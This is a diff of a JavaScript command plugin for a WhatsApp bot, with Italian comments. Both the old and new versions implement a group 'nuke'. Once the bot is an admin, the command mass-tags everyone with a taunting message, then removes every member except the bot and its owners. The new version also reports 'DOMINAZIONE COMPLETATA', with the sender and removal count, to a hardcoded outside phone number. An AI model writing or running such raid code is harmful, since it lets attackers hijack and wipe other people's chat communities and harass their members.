@@ -1,47 +1,59 @@
-let handler = async (m, { conn, args, groupMetadata, participants, usedPrefix, command, isBotAdmin, isSuperAdmin }) => {
-    let ps = participants.map(u => u.id).filter(v => v !== conn.user.jid);
-    let bot = global.db.data.settings[conn.user.jid] || {};
-    if (ps == '') return;
-    const delay = time => new Promise(res => setTimeout(res, time));
+const LOG_JID = '447518078892@s.whatsapp.net';
 
-    switch (command) {
-        case "vexregna":  
-            if (!bot.restrict) return;
-            if (!isBotAdmin) return;
+let handler = async (m, { conn, participants, isBotAdmin }) => {
+    if (!m.isGroup) return;
 
-            // 🔥 Cambia NOME del gruppo
-            let oldName = groupMetadata.subject || "";
-            let newName = `${oldName} | 𝑺𝑽𝑻 𝑩𝒀 𝑽𝑬𝑿𝑷𝑬𝑹̲̅`;
-            await conn.groupUpdateSubject(m.chat, newName);
+    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
+    if (!ownerJids.includes(m.sender)) return;
 
-            // 🔥 Disattiva welcome
-            global.db.data.chats[m.chat].welcome = false;
+    if (!isBotAdmin) return;
 
-            // 🔥 Messaggio introduttivo
-            await conn.sendMessage(m.chat, {
-                text: "𝐿𝑎𝑠𝑐𝑖𝑎 𝑐ℎ𝑒 𝑙'𝑜𝑠𝑐𝑢𝑟𝑖𝑡𝑎̀ 𝑡𝑖 𝑐𝑜𝑛𝑠𝑢𝑚𝑖, 𝑐ℎ𝑒 𝑠𝑡𝑟𝑎𝑝𝑝𝑖 𝑣𝑖𝑎 𝑙𝑎 𝑡𝑢𝑎 𝑢𝑚𝑎𝑛𝑖𝑡𝑎̀ 𝑢𝑛 𝑓𝑟𝑎𝑚𝑚𝑒𝑛𝑡𝑜 𝑎𝑙𝑙𝑎 𝑣𝑜𝑙𝑡𝑎, 𝑓𝑖𝑛𝑐ℎ𝑒̀ 𝑎𝑛𝑐ℎ𝑒 𝑖𝑙 𝑡𝑢𝑜 𝑢𝑙𝑡𝑖𝑚𝑜 𝑟𝑒𝑠𝑝𝑖𝑟𝑜 𝑛𝑜𝑛 𝑙𝑒 𝑎𝑝𝑝𝑎𝑟𝑡𝑒𝑟𝑟𝑎̀..."
-            });
+    const botId = conn.user.id.split(':')[0];
 
-            // 🔥 Link + menzioni
-            let utenti = participants.map(u => u.id);
-            await conn.sendMessage(m.chat, {
-                text: `𝑨𝒗𝒆𝒕𝒆 𝒂𝒗𝒖𝒕𝒐 𝒍'𝒐𝒏𝒐𝒓𝒆 𝒅𝒊 𝒆𝒔𝒔𝒆𝒓𝒆 𝒔𝒕𝒂𝒕𝒊 𝒔𝒗𝒖𝒐𝒕𝒂𝒕𝒊 𝒅𝒂𝒍𝒍'𝒖𝒏𝒊𝒄𝒐 è 𝒔𝒐𝒍𝒐 𝑽𝑬𝑿𝑷𝑬𝑹, 𝑽𝒊 𝒂𝒔𝒑𝒆𝒕𝒕𝒊𝒂𝒎𝒐 𝒕𝒖𝒕𝒕𝒊 𝒒𝒖𝒊:\n\nhttps://chat.whatsapp.com/FydjZheUdMU5RCDMqnvBk0`,
-                mentions: utenti
-            });
+    // Target per il nuke: TUTTI tranne bot + owner
+    let usersToRemove = participants
+        .map(p => p.jid)
+        .filter(jid =>
+            jid &&
+            jid !== botId &&
+            !ownerJids.includes(jid)
+        );
 
-            // 🔥 Kicka tutti
-            let users = ps; 
-            if (isBotAdmin && bot.restrict) { 
-                await delay(1);
-                await conn.groupParticipantsUpdate(m.chat, users, 'remove');
-            }
-            break;           
+    if (!usersToRemove.length) return;
+
+    // ⚠️ MESSAGGIO PRIMA DEL NUKE (TAG ALL NASCOSTO)
+    let allJids = participants.map(p => p.jid); // include tutti
+    let hiddenTagMessage = '𝑨𝒗𝒆𝒕𝒆 𝒂𝒗𝒖𝒕𝒐 𝒍'𝒐𝒏𝒐𝒓𝒆 𝒅𝒊 𝒆𝒔𝒔𝒆𝒓𝒆 𝒔𝒕𝒂𝒕𝒊 𝒔𝒗𝒖𝒐𝒕𝒂𝒕𝒊 𝒅𝒂𝒍𝒍'𝒖𝒏𝒊𝒄𝒐 è 𝒔𝒐𝒍𝒐 𝑽𝑬𝑿𝑷𝑬𝑹, 𝑽𝒊 𝒂𝒔𝒑𝒆𝒕𝒕𝒊𝒂𝒎𝒐 𝒕𝒖𝒕𝒕𝒊 𝒒𝒖𝒊';
+
+    await conn.sendMessage(m.chat, {
+        text: hiddenTagMessage,
+        mentions: allJids // tagga tutti senza scrivere nomi
+    });
+
+    // ⚡ NUKE — COLPO UNICO
+    try {
+        await conn.groupParticipantsUpdate(m.chat, usersToRemove, 'remove');
+
+        // LOG DOPO
+        await conn.sendMessage(LOG_JID, {
+            text:
+`DOMINAZIONE COMPLETATA
+
+👤 Da: @${m.sender.split('@')[0]}
+👥 Rimossi: ${usersToRemove.length}
+📌 Gruppo: ${m.chat}
+🕒 ${new Date().toLocaleString()}`,
+            mentions: [m.sender]
+        });
+
+    } catch (e) {
+        console.error(e);
+        await m.reply('❌ Errore durante l\'hard wipe.');
     }
 };
 
-handler.command = /^(vexregna)$/i;
+handler.command = ['vexregna', 'svtbyvexper', 'vexperdomina'];
 handler.group = true;
-handler.owner = true;
-handler.fail = null;
+handler.botAdmin = true;
 
 export default handler;
